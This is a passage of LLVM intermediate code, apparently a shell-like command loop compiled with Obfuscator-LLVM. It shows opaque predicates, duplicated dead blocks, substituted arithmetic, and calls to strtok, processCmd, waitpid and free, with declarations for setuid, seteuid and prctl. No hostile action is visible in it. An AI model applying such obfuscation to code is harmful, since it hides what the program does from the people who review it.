  %449 = load i8*, i8** %448, align 8
  %450 = load i8*, i8** %21, align 8
  %451 = call i64 @strlen(i8* %450) #9
  %452 = add i64 %451, 1
  call void @llvm.memset.p0i8.i64(i8* %449, i8 0, i64 %452, i32 1, i1 false)
  %453 = load i32, i32* %20, align 4
  %454 = sext i32 %453 to i64
  %455 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %454
  %456 = load i8*, i8** %455, align 8
  %457 = load i8*, i8** %21, align 8
  %458 = call i8* @strcpy(i8* %456, i8* %457) #5
  %459 = load i32, i32* %20, align 4
  %460 = add nsw i32 %459, 1
  store i32 %460, i32* %20, align 4
  br label %461

; <label>:461:                                    ; preds = %438, %433
  %462 = load i32, i32* @x.81
  %463 = load i32, i32* @y.82
  %464 = sub i32 %462, 1
  %465 = mul i32 %462, %464
  %466 = urem i32 %465, 2
  %467 = icmp eq i32 %466, 0
  %468 = icmp slt i32 %463, 10
  %469 = or i1 %467, %468
  br i1 %469, label %originalBB49, label %originalBB49alteredBB

originalBB49:                                     ; preds = %originalBB49alteredBB, %461
  %470 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.132, i32 0, i32 0)) #5
  store i8* %470, i8** %21, align 8
  %471 = load i32, i32* @x.81
  %472 = load i32, i32* @y.82
  %473 = sub i32 %471, 1
  %474 = mul i32 %471, %473
  %475 = urem i32 %474, 2
  %476 = icmp eq i32 %475, 0
  %477 = icmp slt i32 %472, 10
  %478 = or i1 %476, %477
  br i1 %478, label %originalBBpart251, label %originalBB49alteredBB

originalBBpart251:                                ; preds = %originalBB49
  br label %430

; <label>:479:                                    ; preds = %430
  %480 = load i32, i32* @x.81
  %481 = load i32, i32* @y.82
  %482 = sub i32 %480, 1
  %483 = mul i32 %480, %482
  %484 = urem i32 %483, 2
  %485 = icmp eq i32 %484, 0
  %486 = icmp slt i32 %481, 10
  %487 = or i1 %485, %486
  br i1 %487, label %originalBB53, label %originalBB53alteredBB

originalBB53:                                     ; preds = %originalBB53alteredBB, %479
  %488 = load i32, i32* %20, align 4
  %489 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i32 0, i32 0
  call void @processCmd(i32 %488, i8** %489)
  %490 = load i32, i32* %20, align 4
  %491 = icmp sgt i32 %490, 1
  %492 = load i32, i32* @x.81
  %493 = load i32, i32* @y.82
  %494 = sub i32 %492, 1
  %495 = mul i32 %492, %494
  %496 = urem i32 %495, 2
  %497 = icmp eq i32 %496, 0
  %498 = icmp slt i32 %493, 10
  %499 = or i1 %497, %498
  br i1 %499, label %originalBBpart255, label %originalBB53alteredBB

originalBBpart255:                                ; preds = %originalBB53
  br i1 %491, label %500, label %530

; <label>:500:                                    ; preds = %originalBBpart255
  store i32 1, i32* %22, align 4
  store i32 1, i32* %22, align 4
  br label %501

; <label>:501:                                    ; preds = %526, %500
  %502 = load i32, i32* @x.81
  %503 = load i32, i32* @y.82
  %504 = sub i32 %502, 1
  %505 = mul i32 %502, %504
  %506 = urem i32 %505, 2
  %507 = icmp eq i32 %506, 0
  %508 = icmp slt i32 %503, 10
  %509 = or i1 %507, %508
  br i1 %509, label %originalBB57, label %originalBB57alteredBB

originalBB57:                                     ; preds = %originalBB57alteredBB, %501
  %510 = load i32, i32* %22, align 4
  %511 = load i32, i32* %20, align 4
  %512 = icmp slt i32 %510, %511
  %513 = load i32, i32* @x.81
  %514 = load i32, i32* @y.82
  %515 = sub i32 %513, 1
  %516 = mul i32 %513, %515
  %517 = urem i32 %516, 2
  %518 = icmp eq i32 %517, 0
  %519 = icmp slt i32 %514, 10
  %520 = or i1 %518, %519
  br i1 %520, label %originalBBpart259, label %originalBB57alteredBB

originalBBpart259:                                ; preds = %originalBB57
  br i1 %512, label %521, label %529

; <label>:521:                                    ; preds = %originalBBpart259
  %522 = load i32, i32* %22, align 4
  %523 = sext i32 %522 to i64
  %524 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i64 0, i64 %523
  %525 = load i8*, i8** %524, align 8
  call void @free(i8* %525) #5
  br label %526

; <label>:526:                                    ; preds = %521
  %527 = load i32, i32* %22, align 4
  %528 = add nsw i32 %527, 1
  store i32 %528, i32* %22, align 4
  br label %501

; <label>:529:                                    ; preds = %originalBBpart259
  br label %530

; <label>:530:                                    ; preds = %529, %originalBBpart255
  br label %531

; <label>:531:                                    ; preds = %530, %277
  br label %133

; <label>:532:                                    ; preds = %133
  br label %533

; <label>:533:                                    ; preds = %532, %120
  %534 = load i32, i32* @x.81
  %535 = load i32, i32* @y.82
  %536 = sub i32 %534, 1
  %537 = mul i32 %534, %536
  %538 = urem i32 %537, 2
  %539 = icmp eq i32 %538, 0
  %540 = icmp slt i32 %535, 10
  %541 = or i1 %539, %540
  br i1 %541, label %originalBB61, label %originalBB61alteredBB

originalBB61:                                     ; preds = %originalBB61alteredBB, %533
  %542 = load i32, i32* @x.81
  %543 = load i32, i32* @y.82
  %544 = sub i32 %542, 1
  %545 = mul i32 %542, %544
  %546 = urem i32 %545, 2
  %547 = icmp eq i32 %546, 0
  %548 = icmp slt i32 %543, 10
  %549 = or i1 %547, %548
  br i1 %549, label %originalBBpart263, label %originalBB61alteredBB

originalBBpart263:                                ; preds = %originalBB61
  ret i32 0

originalBBalteredBB:                              ; preds = %originalBB, %51
  %550 = load i32, i32* %7, align 4
  %551 = icmp ne i32 %550, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %77
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %97
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %139
  %552 = load i32, i32* %12, align 4
  %553 = sext i32 %552 to i64
  %554 = load i64, i64* @numpids, align 8
  %555 = icmp ult i64 %553, %554
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %160
  %556 = load i32*, i32** @pids, align 8
  %557 = load i32, i32* %12, align 4
  %558 = sext i32 %557 to i64
  %559 = getelementptr inbounds i32, i32* %556, i64 %558
  %560 = load i32, i32* %559, align 4
  %561 = call i32 @waitpid(i32 %560, i32* null, i32 1)
  %562 = icmp sgt i32 %561, 0
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %192
  %563 = load i32*, i32** @pids, align 8
  %564 = load i32, i32* %14, align 4
  %565 = zext i32 %564 to i64
  %566 = getelementptr inbounds i32, i32* %563, i64 %565
  %567 = load i32, i32* %566, align 4
  %568 = load i32*, i32** @pids, align 8
  %569 = load i32, i32* %14, align 4
  %_ = sub i32 0, %569
  %gen = add i32 %_, 1
  %_19 = shl i32 %569, 1
  %_20 = shl i32 %569, 1
  %_21 = sub i32 0, %569
  %gen22 = add i32 %_21, 1
  %_23 = sub i32 %569, 1
  %gen24 = mul i32 %_23, 1
  %_25 = sub i32 0, %569
  %gen26 = add i32 %_25, 1
  %_27 = sub i32 %569, 1
  %gen28 = mul i32 %_27, 1
  %570 = sub i32 %569, 1
  %571 = zext i32 %570 to i64
  %572 = getelementptr inbounds i32, i32* %568, i64 %571
  store i32 %567, i32* %572, align 4
  br label %originalBB18

originalBB33alteredBB:                            ; preds = %originalBB33, %291
  %573 = load i8*, i8** %16, align 8
  %574 = load i8, i8* %573, align 1
  %575 = zext i8 %574 to i32
  %576 = icmp ne i32 %575, 0
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %350
  br label %originalBB37

originalBB41alteredBB:                            ; preds = %originalBB41, %368
  %577 = load i8*, i8** %15, align 8
  %578 = load i8*, i8** %15, align 8
  %579 = call i64 @strlen(i8* %578) #9
  %_42 = shl i64 %579, 1
  %_43 = shl i64 %579, 1
  %_44 = sub i64 0, %579
  %gen45 = add i64 %_44, 1
  %580 = sub i64 %579, 1
  %581 = getelementptr inbounds i8, i8* %577, i64 %580
  store i8 0, i8* %581, align 1
  br label %originalBB41

originalBB49alteredBB:                            ; preds = %originalBB49, %461
  %582 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.132, i32 0, i32 0)) #5
  store i8* %582, i8** %21, align 8
  br label %originalBB49

originalBB53alteredBB:                            ; preds = %originalBB53, %479
  %583 = load i32, i32* %20, align 4
  %584 = getelementptr inbounds [10 x i8*], [10 x i8*]* %19, i32 0, i32 0
  call void @processCmd(i32 %583, i8** %584)
  %585 = load i32, i32* %20, align 4
  %586 = icmp sgt i32 %585, 1
  br label %originalBB53

originalBB57alteredBB:                            ; preds = %originalBB57, %501
  %587 = load i32, i32* %22, align 4
  %588 = load i32, i32* %20, align 4
  %589 = icmp slt i32 %587, %588
  br label %originalBB57

originalBB61alteredBB:                            ; preds = %originalBB61, %533
  br label %originalBB61
}

; Function Attrs: nounwind
declare i8* @strncpy(i8*, i8*, i64) #3

declare i32 @prctl(...) #1

declare i32 @waitpid(i32, i32*, i32) #1

; Function Attrs: nounwind
declare i32 @chdir(i8*) #3

; Function Attrs: nounwind
declare i32 @setuid(i32) #3

; Function Attrs: nounwind
declare i32 @seteuid(i32) #3

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #3

declare i32 @sleep(i32) #1

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind }
attributes #3 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { nounwind }
attributes #6 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readonly }
attributes #10 = { nounwind readnone }
attributes #11 = { noreturn }
attributes #12 = { noreturn nounwind }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146537462}
!2 = !{i32 -2146536334}
!3 = !{i32 -2146535643}
!4 = !{i32 -2146534894}
